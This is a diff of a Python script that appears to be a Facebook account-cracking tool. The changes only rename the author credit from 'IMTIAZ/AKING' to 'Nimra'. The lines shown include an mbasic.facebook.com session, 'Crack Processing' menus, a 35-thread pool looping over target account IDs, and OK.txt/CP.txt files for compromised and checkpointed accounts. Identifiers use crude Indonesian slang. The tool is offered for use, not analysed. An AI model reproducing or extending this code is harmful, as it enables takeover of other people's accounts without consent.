@@ -73,8 +73,8 @@ id = []
 user = []
 num = 0
 loop = 0
-IMTIAZ = requests.get
-Prof_Imtiaz = open
+Nimra = requests.get
+Prof_Nimra = open
 _silet_koceng_  = requests.Session()
 url_mb = "https://mbasic.facebook.com"
 bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
@@ -157,13 +157,13 @@ class __crack__:
 					def _sempak_(bse=None):
 						boy = input('\nPilih : ')
 						if boy == '':
-							IMTIAZ_AKING('\nJangan Kosong')
+							Nimra_Malik('\nJangan Kosong')
 							time.sleep(1);self._sempak_()
 						elif boy == "1" or boy == "01":
-							IMTIAZ_AKING('\n[•] Result OK saved to OK.txt')
-							IMTIAZ_AKING('[•] Result CP saved to CP.txt')
-							IMTIAZ_AKING('\n\tCrack Processing...\n')
-							IMTIAZ_AKING('\n\tCrack Processing...\n\n');logo()
+							Nimra_Malik('\n[•] Result OK saved to OK.txt')
+							Nimra_Malik('[•] Result CP saved to CP.txt')
+							Nimra_Malik('\n\tCrack Processing...\n')
+							Nimra_Malik('\n\tCrack Processing...\n\n');logo()
 							with ThreadPoolExecutor(max_workers=35) as (_ngentot_gratis_):
 								for ikeh in self.id:
 									try:
@@ -208,11 +208,11 @@ class __crack__:
 					break
 		elif _jokowi_kontol_ in ('Y', 'y'):
 			print (' [*]=============================================')
-			IMTIAZ_AKING('\n\t------[ Method Crack ]-----')
+			Nimra_Malik('\n\t------[ Method Crack ]-----')
 			print (' [*]=============================================')
-			Nimra_Malik(' [1] AKING Method 1 ')
-			Nimra_Malik(' [2] AKING Method 2  [ Pro ]')
-			Nimra_Malik(' [3] AKING Method 3   ')
+			Nimra_Malik(' [1] Nimra Method 1 ')
+			Nimra_Malik(' [2] Nimra Method 2  [ Pro ]')
+			Nimra_Malik(' [3] Nimra Method 3   ')
 			print (' [*]=============================================')
 			self.__pler__()
 		else:
